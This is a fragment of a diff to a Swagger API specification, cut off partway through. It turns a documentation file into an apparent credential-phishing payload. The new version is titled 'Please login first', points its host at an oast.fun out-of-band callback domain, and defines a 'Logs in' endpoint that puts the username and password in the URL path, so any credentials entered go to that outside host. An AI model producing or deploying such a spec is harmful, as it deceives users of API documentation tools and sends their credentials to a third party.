@@ -1,28 +1,16 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  title: Classic API Resource Documentation
-  description: 
-  version: production
-basePath: ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
+  version: "v1"
+  title: Please login first
+
+host: ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun
+
 paths:
+
   /{Username}/{Password}:
     post:
       summary: Logs in
       parameters:
-        - description:
-          format: int64
-          in: path
-          name: id
-          required: false
-          type: integer
         - name: Username 
           required: true
           in: path
